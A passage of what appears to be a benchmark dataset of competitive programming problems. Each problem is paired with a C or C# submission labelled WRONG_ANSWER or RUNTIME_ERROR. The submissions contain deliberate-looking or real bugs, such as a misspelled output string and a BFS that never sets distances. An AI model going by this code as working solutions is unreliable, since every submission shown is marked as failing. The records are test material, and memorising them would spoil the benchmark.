later stages of the game Roma faced difficulties solving a puzzle.In this part Roma fights with a cunning enemy magician. The battle takes place on a rectangular field plaid n\u2009\u00d7\u2009m. Each cell contains one magical character: L, R or X. Initially all the squares of the field are \"active\".The players, Roma and enemy magician, take turns. Roma makes the first move. During a move a player selects one of the active cells. Then depending on the image in the character in the cell one of the following actions takes place:   L \u2014 magical waves radiate from the cell to the left downwards and to the right upwards along diagonal paths. All cells on the path of the waves (including the selected cell too) become inactive. The waves continue until the next inactive cell or to the edge of the field if there are no inactive cells on the way.  R \u2014 the magical waves radiate to the left upwards and to the right downwards.  X \u2014 the magical waves radiate in all four diagonal directions. If the next player cannot make a move (i.e., all cells are inactive), he loses.Roma has been trying to defeat the computer opponent for three days but he just keeps losing. He asks you to help him and determine whether it is guaranteed that he can beat the opponent, or he will have to hack the game.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u200920). Next n lines contain m characters describing the playing field: the j-th character of the i-th line equals to the magical character of the corresponding field square.","output_spec":"On the first line print \"WIN\" if Roma can win or \"LOSE\" if it is impossible to win considering that the opponent pays optimally.","notes":"NoteIn the first test each move makes one diagonal line of the square inactive, thus it is guaranteed that Roma loses after two moves.There are three variants of making a move in the second test: to \"finish off\" the main diagonal line or any of the squares that are left. That means that after three moves the game stops and Roma wins.","sample_inputs":["2 2\nRL\nLR","2 2\nRR\nRR"],"sample_outputs":["LOSE","WIN"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_303","tags":["graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\n#include<string.h>\n#include<time.h>\n#include<ctype.h>\n#include<limits.h>\n#define eps 1e-7\n#define MOD 1000000007\n#define ll long long int\n#define N 450000\nint que[N];\nint graph[1000][1000];\nint new_graph[1000][1000];\nint dist[N];\nint visited[N];\nint rear=-1;\nint front=-1;\nvoid insert_que(int x){\n   que[++rear]=x;\n   if(rear==0)\n   front=0;\n}\nint pop_que(){\n   return que[front++];\n}\nint is_empty(){\n   return front>rear?1:0;\n}\nint solve(int x,int n){\n   insert_que(x);\n   visited[x]=1;\n   while(!is_empty()){\n      int get=pop_que();\n      for(int i=1;i<=n;i++){\n         if(!visited[i] && new_graph[get][i]){\n            visited[i]=1;\n            insert_que(i);\n         }\n         if(!visited[i] && new_graph[get][i]){\n            dist[i]=dist[get]+1;\n         }\n      }\n   }\n   return dist[n]==0?-1:dist[n];\n}\nint solve1(int x,int n){\n   insert_que(x);\n   visited[x]=1;\n   while(!is_empty()){\n      int get=pop_que();\n      for(int i=1;i<=n;i++){\n         if(!visited[i] && graph[get][i]){\n            visited[i]=1;\n            insert_que(i);\n         }\n         if(!visited[i] && graph[get][i]){\n            dist[i]=dist[get]+1;\n         }\n      }\n   }\n   return dist[n]==0?-1:dist[n];\n}\nint main(){\n   int a,b,c,d;\n   scanf(\"%d%d\",&a,&b);\n   int flag=2;\n   for(int i=0;i<b;i++){\n      int foo[2];\n      scanf(\"%d%d\",foo,foo+1);\n      graph[foo[0]][foo[1]]=1;\n      graph[foo[1]][foo[0]]=1;\n   }\n   for(int i=1;i<=a;i++){\n      for(int w=1;w<=a;w++){\n         if(i!=w){\n            if(!graph[i][w]){\n               new_graph[i][w]=1;\n            }\n         }\n      }\n   }\n   int x=solve(1,a);\n   memset(visited,0,sizeof(visited));\n   memset(que,0,sizeof(que));\n   front=rear=-1;\n   memset(dist,0,sizeof(dist));\n   int x1=solve1(1,a);\n   if(x==-1 || x1==1){\n      printf(\"-1\");\n      return 0;\n   }\n   x>x1?printf(\"%d\",x):printf(\"%d\",x1);\n}","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"ffafd385ec79aa28b8d30224baf6bcfe","submission_id":"re_322","tags":["dp","combinatorics","probabilities","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n\nint main()\n{\n     int n, m, h, sum = 0, i;\n     int s[1000];\n     double d = 1;\n\n     scanf(\"%d %d %d\", &n, &m, &h);\n\n     for (i = 0; i < m; i++) {\n\t  scanf(\"%d\", &s[i]);\n\n\t  sum += s[i];\n     }\n\n     if (sum < n || s[h - 1] == 1) {\n\t  puts(\"-1.0\\n\");\n\n\t  return 0;\n     }\n\n     if (sum - s[h - 1] < n - 1) {\n\t  puts(\"1.0\\n\");\n\n\t  return 0;\n     }\n\n     for (i = 0; i < n - 1; i++) {\n\t  d *= (double)(sum - s[h - 1] - i) \/ (sum - i - 1);\n     }\n\n     printf(\"%.9lf\\n\", 1 - d);\n\n     return 0;\n}\n","description":"As a German University in Cairo (GUC) student and a basketball player, Herr Wafa was delighted once he heard the news. GUC is finally participating in the Annual Basketball Competition (ABC). A team is to be formed of n players, all of which are GUC students. However, the team might have players belonging to different departments. There are m departments in GUC, numbered from 1 to m. Herr Wafa's department has number h. For each department i, Herr Wafa knows number si \u2014 how many students who play basketball belong to this department.Herr Wafa was also able to guarantee a spot on the team, using his special powers. But since he hates floating-point numbers, he needs your help at finding the probability that he will have at least one teammate belonging to his department. Note that every possible team containing Herr Wafa is equally probable. Consider all the students different from each other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m and h (1\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009m\u2009\u2264\u20091000,\u20091\u2009\u2264\u2009h\u2009\u2264\u2009m) \u2014 the number of players on the team, the number of departments in GUC and Herr Wafa's department, correspondingly.  The second line contains a single-space-separated list of m integers si (1\u2009\u2264\u2009si\u2009\u2264\u2009100), denoting the number of students in the i-th department. Note that sh includes Herr Wafa.","output_spec":"Print the probability that Herr Wafa will have at least one teammate from his department. If there is not enough basketball players in GUC to participate in ABC, print -1. The answer will be accepted if it has absolute or relative error not exceeding 10\u2009-\u20096.","notes":"NoteIn the first example all 3 players (2 from department 1 and 1 from department 2) must be chosen for the team. Both players from Wafa's departments will be chosen, so he's guaranteed to have a teammate from his department.In the second example, there are not enough players.In the third example, there are three possibilities to compose the team containing Herr Wafa. In two of them the other player from Herr Wafa's department is part of the team.","sample_inputs":["3 2 1\n2 1","3 2 1\n1 1","3 2 1\n2 2"],"sample_outputs":["1","-1","0.666667"]}
{"difficulty":900,"lang":"Mono C#","lang_cluster":"c#","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_799","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.IO;\n\nnamespace _132\n{\n    class ProgramA\n    {\n        static void Main(string[] args)\n        {\n            var A = ReadInts();\n             A = ReadInts();\n             var B = ReadInts();\n             B = ReadInts();\n             Dictionary<int, int> r = new Dictionary<int, int>();\n            foreach (var it in A)\n            {\n                foreach (var t in B)\n                {\n                    if (t != it)\n                    {\n                        if (t % it == 0)\n                        {\n                            var d = t \/ it;\n                            if (!r.ContainsKey(d)) r[d] = 0;\n                            r[d]++;\n                        }\n                    }\n                }\n            }\n            Console.WriteLine(r[r.Max(x=>x.Key)]);\n        }\n\n        static IEnumerable<int> ReadInts(Func<int, int> f = null)  \n        {\n            var t = Console.ReadLine();\n            var ret = new List<int>();\n            foreach (var it in t.Split(' '))\n                ret.Add( f == null ? int.Parse(it): f(int.Parse(it)));\n            return ret;\n        }\n    }\n}\n","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1400,"lang":"Mono C#","lang_cluster":"c#","src_uid":"138fd96bf5a677a6d59c20f88fd612f1","submission_id":"re_1217","tags":["greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace ConsoleApplication3\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            long n, x, y;\n            string s = Console.ReadLine();\n            char[] par = { ' ' };\n            string[] ss = s.Split(par);\n            n = Convert.ToInt64(ss[0]);\n            x = Convert.ToInt64(ss[1]);\n            y = Convert.ToInt64(ss[2]);\n\n            if (n > y)\n            {\n                Console.WriteLine(-1);\n            }\n            else\n            {\n                if ((y - n + 1) * (y - n + 1) >= x)\n                {\n                    for (int i = 0; i < n - 1; i++)\n                        Console.WriteLine(\"1\");\n                    Console.WriteLine(y - n + 1);\n                }\n                else Console.WriteLine(-1);\n            }\n        }\n    }\n}\n","description":"Little Petya loves inequations. Help him find n positive integers a1,\u2009a2,\u2009...,\u2009an, such that the following two conditions are satisfied: a12\u2009+\u2009a22\u2009+\u2009...\u2009+\u2009an2\u2009\u2265\u2009x a1\u2009+\u2009a2\u2009+\u2009...\u2009+\u2009an\u2009\u2264\u2009y","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n, x and y (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20091\u2009\u2264\u2009x\u2009\u2264\u20091012,\u20091\u2009\u2264\u2009y\u2009\u2264\u2009106). Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is recommended to use cin, cout streams or the %I64d specificator.","output_spec":"Print n positive integers that satisfy the conditions, one integer per line. If such numbers do not exist, print a single number \"-1\". If there are several solutions, print any of them.","notes":null,"sample_inputs":["5 15 15","2 3 2","1 99 11"],"sample_outputs":["4\n4\n1\n1\n2","-1","11"]}
{"difficulty":1200,"lang":"Mono C#","lang_cluster":"c#","src_uid":"15fa49860e978d3b3fb7a20bf9f8aa86","submission_id":"re_899","tags":["implementation","geometry","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\nnamespace ProgrammingContest.Codeforces.Round9\n{\n    class C\n    {\n        public static void Main()\n        {\n            string[] s = Console.ReadLine().Split(' ');\n            int n = int.Parse(s[0]);\n            double vb = double.Parse(s[1]);\n            double vs = double.Parse(s[2]);\n\n            s = Console.ReadLine().Split(' ');\n            double[] busStopX = new double[n];\n            for (int i = 0; i < n; i++)\n            {\n                busStopX[i] = double.Parse(s[i]);\n            }\n\n            s = Console.ReadLine().Split(' ');\n            double xu, yu;\n            xu = double.Parse(s[0]);\n            yu = double.Parse(s[1]);\n\n            int optIndex = -1;\n            double timeMin = double.MaxValue;\n            double distMin = double.MaxValue;\n            for (int i = 0; i < n; i++)\n            {\n                double dx = xu - busStopX[i];\n                double dy = yu;\n                double dist = Math.Sqrt(dx * dx + dy * dy);\n                double time = busStopX[i] \/ vb + dist \/ vs;\n                if (timeMin > time || timeMin == time && distMin > dist)\n                {\n                    timeMin = time;\n                    distMin = dist;\n                    optIndex = i;\n                }\n            }\n            Console.WriteLine(optIndex+1);\n        }\n    }\n}\n","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,\u20090), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,\u20090)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,\u2009yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009vb,\u2009vs\u2009\u2264\u20091000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u2009\u2264\u2009105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute value. ","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.","notes":"NoteAs you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.","sample_inputs":["4 5 2\n0 2 4 6\n4 1","2 1 1\n0 100000\n100000 100000"],"sample_outputs":["3","2"]}
{"difficulty":1200,"lang":"MS C#","lang_cluster":"c#","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_430","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System; using System.Linq;\n\nclass P {\n  static void Main() {\n    Console.ReadLine();\n    var a = Console.ReadLine().Split(' ').Select(int.Parse).ToArray();\n    var p = Console.ReadLine().Split(' ').Select(int.Parse).ToArray();\n    var left = 0;\n    var props = new int[p.Length];\n    foreach (var ai in a) {\n      left += ai;\n      for (var j = p.Length - 1; j >= 0 ; j--) if (p[j] <= left) {\n        props[j]++;\n        left -= p[j];\n        j++;\n      }\n    }\n    Console.WriteLine(string.Join(\" \", props));\n    Console.Write(left);\n  }\n}","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1200,"lang":"MS C#","lang_cluster":"c#","src_uid":"3d6411d67c85f6293f1999ccff2cd8ba","submission_id":"re_1415","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace cf\n{\n    class Program\n    {\n\n        static void Main(string[] args)\n        {\n            try\n            {\n                int[] nk = Console.ReadLine().Split(' ').Select(int.Parse).ToArray();\n                int[] ar = Console.ReadLine().Split(' ').Select(int.Parse).ToArray();\n                int c = 0;\n                while (ar[0] != nk[1])\n                {\n                    bool x = false;\n                    for (int i = 0; i < ar.Length - 1; i++)\n                    {\n                        if (ar[i] != ar[i + 1])\n                        {\n                            if (ar[i] != nk[1])\n                            {\n                                ar[i]++;\n                                x = true;\n                            }\n                        }\n                        else if (i == ar.Length - 2)\n                        {\n                            if (ar[i] == ar[i + 1])\n                            {\n                                if (ar[i] != nk[1])\n                                {\n                                    ar[i+1]++;\n                                    x = true;\n                                }\n                                else\n                                {\n                                    if (ar[i] != nk[1])\n                                    {\n                                        ar[i]++;\n                                        x = true;\n                                    }\n                                    if (ar[i + 1] != nk[1])\n                                    {\n                                        ar[i + 1]++;\n                                        x = true;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    if (x)\n                        c++;\n                    \/\/for (int j = 0; j < ar.Length; j++)\n                    \/\/{\n                    \/\/    Console.Write(ar[j] + \" \");\n                    \/\/}\n                    \/\/Console.WriteLine();\n                }\n                Console.WriteLine(c-1);\n                Console.ReadKey();\n\n            }\n            catch { }\n            }\n        \n    }\n}\n","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2009\u2264\u2009i\u2009\u2264\u2009n, 1\u2009\u2264\u2009ai\u2009\u2264\u2009k).","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.","notes":"NoteIn the first example the ranks will be raised in the following manner:1 2 2 3 \u2009\u2192\u2009 2 2 3 4 \u2009\u2192\u2009 2 3 4 4 \u2009\u2192\u2009 3 4 4 4 \u2009\u2192\u2009 4 4 4 4Thus totals to 4 training sessions that require 4 golden coins.","sample_inputs":["4 4\n1 2 2 3","4 3\n1 1 1 1"],"sample_outputs":["4","5"]}
{"difficulty":1500,"lang":"Mono C#","lang_cluster":"c#","src_uid":"4ecbfc792da55f458342c6eff2d5da5a","submission_id":"re_1509","tags":["dsu","dfs and similar","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"using System;\nusing System.Collections.Generic;\n\nnamespace ConsoleApplication1\n{\n    class Program\n    {\n        static List<int> roots = new List<int>(); \n        static bool[,] graph;\n        static bool[,] graph2;\n        static bool[] used;\n        static int n;\n        static int count;\n        static int cycleCount = 0;\n\n        static void Main(string[] args)\n        {\n            string[] str = Console.ReadLine().Split(' ');\n            n = int.Parse(str[0]);\n            int m = int.Parse(str[1]);\n            used = new bool[n];\n            graph = new bool[n, n];\n            graph2 = new bool[n, n];\n            int a;\n            int b;\n\n            for (int i = 0; i < m; i++)\n            {\n                str = Console.ReadLine().Split(' ');\n                a = int.Parse(str[0]) - 1;\n                b = int.Parse(str[1]) - 1;\n                graph[a, b] = true;\n                graph[b, a] = true;\n            }\n\n            Solve();\n\n            if (cycleCount == 1 && count == 1)\n            {\n                Console.WriteLine(\"FNTAGN!\");\n            } else\n            {\n                Console.WriteLine(\"NO\");\n            }\n        }\n\n        static void Solve()\n        {\n            used = new bool [n];\n            count = 0;\n\n            for (int i = 0; i < n; i++)\n            {\n                if (!used[i])\n                {\n                    count++;\n                    DFS(i);\n                }\n            }\n        }\n\n        static void DFS(int v) \n        {\n            used[v] = true;\n            for (int j = 0; j < n; j++)\n            {\n                if (j != v && used[j] && graph[v, j] && !graph2[v,j])\n                {\n                    cycleCount++;\n                }\n                graph2[v, j] = true;\n                graph2[j, v] = true;\n                if (!used[j] && graph[v,j])\n                {\n                    DFS(j);\n                }\n            }\n        }\n    }\n}","description":"...Once upon a time a man came to the sea. The sea was stormy and dark. The man started to call for the little mermaid to appear but alas, he only woke up Cthulhu...Whereas on the other end of the world Pentagon is actively collecting information trying to predict the monster's behavior and preparing the secret super weapon. Due to high seismic activity and poor weather conditions the satellites haven't yet been able to make clear shots of the monster. The analysis of the first shot resulted in an undirected graph with n vertices and m edges. Now the world's best minds are about to determine whether this graph can be regarded as Cthulhu or not.To add simplicity, let's suppose that Cthulhu looks from the space like some spherical body with tentacles attached to it. Formally, we shall regard as Cthulhu such an undirected graph that can be represented as a set of three or more rooted trees, whose roots are connected by a simple cycle.It is guaranteed that the graph contains no multiple edges and self-loops.  ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers \u2014 the number of vertices n and the number of edges m of the graph (1\u2009\u2264\u2009n\u2009\u2264\u2009100, 0\u2009\u2264\u2009m\u2009\u2264\u2009). Each of the following m lines contains a pair of integers x and y, that show that an edge exists between vertices x and y (1\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009n,\u2009x\u2009\u2260\u2009y). For each pair of vertices there will be at most one edge between them, no edge connects a vertex to itself.","output_spec":"Print \"NO\", if the graph is not Cthulhu and \"FHTAGN!\" if it is.","notes":"NoteLet us denote as a simple cycle a set of v vertices that can be numbered so that the edges will only exist between vertices number 1 and 2, 2 and 3, ..., v\u2009-\u20091 and v, v and 1.A tree is a connected undirected graph consisting of n vertices and n\u2009-\u20091 edges (n\u2009&gt;\u20090).A rooted tree is a tree where one vertex is selected to be the root.","sample_inputs":["6 6\n6 3\n6 4\n5 1\n2 5\n1 4\n5 4","6 5\n5 6\n4 6\n3 1\n5 1\n1 2"],"sample_outputs":["FHTAGN!","NO"]}
{"difficulty":1100,"lang":"MS C#","lang_cluster":"c#","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1128","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace ConsoleApplication2\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            string s = Console.ReadLine();\n            s = Console.ReadLine();\n            int l = -1, r = -1, k = 0;\n            for (int i = 0; i < s.Length; i++)\n            {\n\n                if (s[i] == 'L')\n                {\n                    l = i;\n                    if(r!=-1 && (i - r )% 2 == 0 ){k++; }\n                }\n                else if (s[i] == 'R')\n                {\n                    if (r == -1 && l==-1) { k += i; }\n                    r = i;\n                    if (l!=-1 &&(i - l )% 2 == 0){k++; }\n                }\n\n            }\n            if (l>r) k += s.Length-l-1;\n            if (l == -1 && r == -1) k = s.Length;\n\n            Console.WriteLine(k);\n\n        }\n    }\n}","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":1100,"lang":"MS C#","lang_cluster":"c#","src_uid":"5d11fa8528f1dc873d50b3417bef8c79","submission_id":"re_866","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffusing System;\nusing static System.Console;\n\nnamespace _66B\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            int n = default(int);\n            int covered = default(int), maxCovered = default(int);\n            n = Int32.Parse(ReadLine());\n            int[] fields = new int[n];\n            string input = ReadLine();\n            for(int i= 0; i < n; i++)\n            {\n                fields[i] = Int32.Parse(input.Split(' ')[i]);\n            }\n\n            for(int CurrentField = 0; CurrentField < fields.Length; CurrentField++)\n            {\n                covered = 1;\n                for(int left = CurrentField -1; (left >= 0)&&(fields[left] < fields[left +1]); left--)\n                {\n                    covered++;\n                }\n                for(int right = CurrentField +1; (right < fields.Length)&&(fields[right] < fields[right-1]); right++)\n                {\n                    covered++;\n                }\n                if(covered > maxCovered)\n                {\n                    maxCovered = covered;\n                }                \n            }\n            Write(maxCovered);\n        }\n    